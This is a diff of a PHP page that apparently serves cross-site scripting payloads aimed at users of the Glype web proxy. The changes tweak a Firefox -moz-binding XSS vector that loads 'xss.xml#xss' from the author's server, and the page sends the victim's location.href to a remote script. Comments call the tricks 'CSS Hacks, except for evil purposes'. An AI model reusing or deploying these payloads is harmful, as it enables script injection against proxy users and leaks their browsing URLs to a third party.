@@ -709,9 +709,9 @@ switch ($mode)
 		$iframe_url = htmlspecialchars($javascript_url);
 		$iframe_src = $iframe_url . !empty($orig_url) ? "&amp;url=$orig_url" : '';
 		// -moz-binding only works in FireFox (and browsers using the gecko rendering engine?), and "expression" works only in IE.
-		$moz_binding_url = $server_url . 'xss.xml#xss';
-		// Glype currently strips out the ending letter "l" from "xss.xml" causing a 404 request for "xss.xm", so this is a lame workaround :/
-		$moz_binding_url2 = $server_url . 'xss.xmll#xss';
+		// Glype currently strips out the ending letter "l" from "xss.xml" causing a 404 request for "xss.xm", so the extra backslash
+		// between 'xss.xml' and '#xss' is a workaround.
+		$moz_binding_url = $server_url . 'xss.xml\#xss';
 		// At this point, we don't really care about valid HTML, because here my friend are loads of *intentional* invalidities, lol :)
 		// Think of these quirks as sort of like "CSS Hacks", except for evil purposes :)
 ?>
@@ -731,7 +731,6 @@ xssObj.src = "<?php echo $javascript_url; ?>&url="+escape(location.href);
 <![endif]-->
 <![if ! IE]>
 <xss style="-moz-binding:url('<?php echo $moz_binding_url; ?>');"></xss>
-<glypexss style="-moz-binding:url('<?php echo $moz_binding_url2; ?>');"></xss>
 <![endif]>
 </body>
 </html>
